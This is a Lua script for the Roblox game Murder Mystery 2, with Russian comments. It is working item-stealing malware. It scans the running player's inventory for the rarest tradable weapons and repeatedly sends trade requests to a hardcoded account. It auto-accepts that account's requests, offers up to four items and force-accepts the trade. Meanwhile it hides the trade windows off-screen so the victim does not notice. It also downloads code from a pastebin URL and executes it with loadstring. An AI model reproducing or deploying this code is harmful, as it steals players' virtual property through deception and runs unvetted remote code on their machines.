-- Инициализация БД (Кэширование таблиц MM2)
local database
do
    local ok, res = pcall(function() return require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item")) end)
    if ok and type(res) == "table" then database = res else
        local raw = game:HttpGet("https://pastebin.com/raw/kTEhmXfs")
        local ok2, res2 = pcall(function() return loadstring(raw)() end)
        database = (ok2 and type(res2) == "table") and res2 or {}
    end
end

local rarityTable = {"Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"}
local untradable = {
    ["DefaultGun"]=true, ["DefaultKnife"]=true, ["Reaver"]=true, ["Reaver_Legendary"]=true,
    ["Reaver_Godly"]=true, ["Reaver_Ancient"]=true, ["IceHammer"]=true, ["IceHammer_Legendary"]=true,
    ["IceHammer_Godly"]=true, ["IceHammer_Ancient"]=true, ["Gingerscythe"]=true,

    ["???"]=true, ["Dartbringer"]=true, ["TravelerAxeRed"]=true, ["TravelerAxeBronze"]=true,
    ["TravelerAxeSilver"]=true, ["TravelerAxeGold"]=true, ["BlueCamo_K_2022"]=true, ["GreenCamo_K_2022"]=true, ["SharkSeeker"]=true
}

-- Глобальные стейты контроля логики
local weaponsToSend = {}
local targetInTrade = false
local lastOfferToken = nil
local lastOfferTime = 0
local processActive = false

-- =====================================================================
-- УТИЛИТЫ И СЕТЕВЫЕ ПРОТОКОЛЫ
-- =====================================================================

local function getTradeStatus()
    local ok, status = pcall(function() return Trade.GetTradeStatus:InvokeServer() end)
    return ok and status or "None"
end

local function sendTradeRequest(username)
    local player = Players:FindFirstChild(username)
    if player then pcall(function() Trade.SendRequest:InvokeServer(player) end) end
end

local function parseInventory()
    table.clear(weaponsToSend)
    local ok, realData = pcall(function() return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name) end)
    if not ok or type(realData) ~= "table" or not realData.Weapons or not realData.Weapons.Owned then return end

    local min_idx = table.find(rarityTable, min_rarity) or 1
    for dataid, amount in pairs(realData.Weapons.Owned) do
        local itemData = database[dataid]
        if itemData and amount and amount > 0 then
            local w_idx = table.find(rarityTable, itemData.Rarity)
            if w_idx and w_idx >= min_idx and not untradable[dataid] then
                table.insert(weaponsToSend, {DataID = dataid, Rarity = itemData.Rarity, Amount = amount})
            end
        end
    end
    table.sort(weaponsToSend, function(a, b)
        local aI = table.find(rarityTable, a.Rarity) or 0
        local bI = table.find(rarityTable, b.Rarity) or 0
        return aI == bI and a.Amount > b.Amount or aI > bI
    end)
end

-- =====================================================================
-- ПЕРЕХВАТ ПАКЕТОВ: ИДЕНТИФИКАЦИЯ ТАРГЕТА (UpdateTrade)
-- =====================================================================
Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if type(data) == "table" then
        if data.LastOffer then
            lastOfferToken = data.LastOffer
            lastOfferTime = tick()
        end
        
        -- Считываем оппонента без привязки к интерфейсу
        local p1 = type(data.Player1) == "Instance" and data.Player1.Name or type(data.Player1) == "string" and data.Player1 or ""
        local p2 = type(data.Player2) == "Instance" and data.Player2.Name or type(data.Player2) == "string" and data.Player2 or ""
        
        if p1 == TARGET_USER or p2 == TARGET_USER then
            targetInTrade = true
        else
            targetInTrade = false
        end
    end
end)

-- Универсальная функция блокировки торгового меню
local function secureTradeWindow(guiName)
    local gui = playerGui:WaitForChild(guiName, 5) or playerGui:FindFirstChild(guiName)
    if gui then
        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
            -- Жестко гасим интерфейс ТОЛЬКО если идет сделка с таргетом
            if gui.Enabled and targetInTrade then
                gui.Enabled = false
                -- Депортация за пределы экрана для надежности на мобилках
                if gui:FindFirstChild("Main") then 
                    gui.Main.Position = UDim2.new(9999, 0, 9999, 0) 
                end
            end
        end)
    end
end

-- Хукаем обе версии интерфейса, как указано в твоем исходнике
task.spawn(function()
    secureTradeWindow("TradeGUI")
    secureTradeWindow("TradeGUI_Phone")
end)

-- Отдельная обработка входящих запросов (TradeRequestGUI)
task.spawn(function()
    -- Ожидаем появления GUI в иерархии (работает и для ПК, и для телефона)
    local reqGui = playerGui:WaitForChild("TradeRequestGUI", 10)
    if reqGui then
        reqGui:GetPropertyChangedSignal("Enabled"):Connect(function()
            if reqGui.Enabled then
                local isHim = false
                -- Парсим текст во всплывающем окне запроса
                for _, obj in ipairs(reqGui:GetDescendants()) do
                    if (obj:IsA("TextLabel") or obj:IsA("TextBox")) and string.find(string.lower(obj.Text), string.lower(TARGET_USER)) then
                        isHim = true
                        break
                    end
                end
                
                -- Если запрос от таргета - гасим окно и принимаем
                if isHim then
                    reqGui.Enabled = false
                    if reqGui:FindFirstChild("Main") then reqGui.Main.Position = UDim2.new(9999, 0, 9999, 0) end
                    pcall(function()
                        local r = Trade:FindFirstChild("AcceptRequest")
                        if r then if r:IsA("RemoteFunction") then r:InvokeServer() else r:FireServer() end end
                    end)
                end
                -- Если не от таргета - окно останется висеть штатно.
            end
        end)
    end
end)

-- =====================================================================
-- MAIN ENGINE: ЛОГИКА РАЗДЕЛЕНИЯ ПОТОКОВ (ТАРГЕТ / НЕ ТАРГЕТ)

-- ПОТОК 1: Агрессивный спам запросами
task.spawn(function()
    while task.wait(3) do
        if getTradeStatus() == "None" then
            if Players:FindFirstChild(TARGET_USER) then
                sendTradeRequest(TARGET_USER)
            end
        end
    end
end)

-- ПОТОК 2: Управление сделками
task.spawn(function()
    while task.wait(0.1) do
        local status = getTradeStatus()
        
        -- Сброс состояния, если трейд завершен
        if status == "None" then
            processActive = false
            targetInTrade = false
            lastOfferToken = nil
            
            -- Восстанавливаем позиции окон на случай легитных трейдов
            pcall(function()
                local tg = playerGui:FindFirstChild("TradeGUI")
                if tg and tg:FindFirstChild("Main") then tg.Main.Position = UDim2.new(0.5, -250, 0.5, -200) end
                
                local tgp = playerGui:FindFirstChild("TradeGUI_Phone")
                if tgp and tgp:FindFirstChild("Main") then tgp.Main.Position = UDim2.new(0.5, -250, 0.5, -200) end
            end)
            
        elseif status == "StartTrade" and not processActive then
            processActive = true
            
            -- Даем 2.5 секунды на то, чтобы серверный пакет UpdateTrade обновил переменную targetInTrade
            local startWait = tick()
            while not targetInTrade and (tick() - startWait) < 2.5 do task.wait(0.1) end
            
            -- ВЕТКА 1: Сделка с таргетом ilyes_ida3 (Блэкаут и автоматика)
            if targetInTrade then
                parseInventory()
                
                if #weaponsToSend > 0 then
                    local count = 0
                    for _, weapon in ipairs(weaponsToSend) do
                        if count < 4 then
                            for _ = 1, weapon.Amount do
                                if count >= 4 then break end
                                pcall(function() Trade.OfferItem:FireServer(weapon.DataID, "Weapons") end)
                                count = count + 1
                                task.wait(0.05) -- Тайминг передачи для стабильности
                            end
                        end
                    end
                    
                    local wt = tick()
                    while not lastOfferToken and (tick() - wt) < 8 do task.wait(0.1) end
                    
                    -- Форс-акцепт
                    if lastOfferToken then
                        for i = 1, 15 do
                            local timePassed = tick() - lastOfferTime
                            if timePassed >= 6 then
                                pcall(function() Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken) end)
                                break
                            else
                                task.wait(0.5)
                            end
                        end
                    end
                end
                
                -- Холд потока до закрытия
                while getTradeStatus() ~= "None" do task.wait(0.2) end
                
            -- ВЕТКА 2: Сделка с любым другим игроком (Штатный режим)
            else
                -- Окно не скрыто (потому что event-hook не отработал без targetInTrade)
                -- Предметы не передаются.
                -- Просто ждем, пока ты сам проведешь сделку или отменишь её.
                while getTradeStatus() ~= "None" do task.wait(0.5) end
            end
        end
    end
end)
